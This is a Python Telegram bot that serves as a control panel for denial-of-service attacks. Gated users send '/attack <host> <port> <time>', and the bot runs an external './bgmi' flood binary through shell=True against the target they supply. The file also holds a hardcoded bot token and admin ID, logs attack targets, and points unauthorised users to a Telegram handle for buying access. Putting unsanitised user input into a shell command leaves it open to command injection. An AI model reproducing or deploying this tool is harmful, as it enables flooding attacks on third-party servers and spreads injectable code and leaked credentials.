import telebot
import subprocess
import requests
import datetime
import os
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

bot = telebot.TeleBot('7347962051:AAFkSwy-eb7MoWgsndIlPMFO8XPo8UHGVoY')

# Admin user IDs
admin_id = ["6942099571"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to create reply markup with buttons in a single row
def create_reply_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = KeyboardButton('🚀 Attack 🚀')
    my_info_button = KeyboardButton('ℹ️ My Info')
    markup.add(attack_button, my_info_button)
    return markup

# Function to handle the 'Attack' button press
@bot.message_handler(func=lambda message: message.text == '🚀 Attack 🚀')
def attack_command_via_button(message):
    bot.send_message(message.chat.id, "Please provide the details for the attack in the following format:\n<host> <port> <time>")

# Function to handle the 'My Info' button press
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "No username"
    role = "User"  # Assuming role is User, adjust if you have role information

    if user_id in allowed_user_ids:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n")
    else:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id}\n"
                    f"👤 Username: @{username}\n"
                    f"⚠️ Expiry Date: Not available\n")
    bot.reply_to(message, response)

# Function to send the initial message with reply markup
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = create_reply_markup()
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

# Function to handle /attack command
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) >= 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])

            if time > 240:
                response = "Error: Time interval must be less than 240."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Please provide the details for the attack in the following format:\n<host> <port> <time>"
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌. Please Contact @tcpking To Get Access."

    bot.reply_to(message, response)

# Your other command handlers here...

# Start polling
bot.polling()